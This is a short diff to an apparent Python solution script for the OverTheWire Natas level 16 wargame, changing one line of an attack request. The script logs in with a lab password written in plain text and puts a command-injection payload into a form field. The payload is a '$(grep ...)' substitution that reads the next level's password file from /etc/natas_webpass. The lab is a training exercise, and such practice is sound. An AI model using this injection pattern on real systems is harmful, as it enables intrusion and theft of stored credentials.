@@ -32,7 +32,7 @@ def get_password():
            request = urllib2.Request("http://natas16.natas.labs.overthewire.org/index.php")
            base64string = base64.encodestring('%s:%s' % ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')).replace('\n', '')
            request.add_header("Authorization", "Basic %s" % base64string)   
-           params=urllib.urlencode({'needle':'$(grep -E ^'+string+' /etc/natas_webpass/natas17)African'})
+           params=urllib.urlencode({'needle':'$(grep ^'+string+' /etc/natas_webpass/natas17)African'})
            result = urllib2.urlopen(request,params)
             
            #Read the response, keep the important part, which we can use
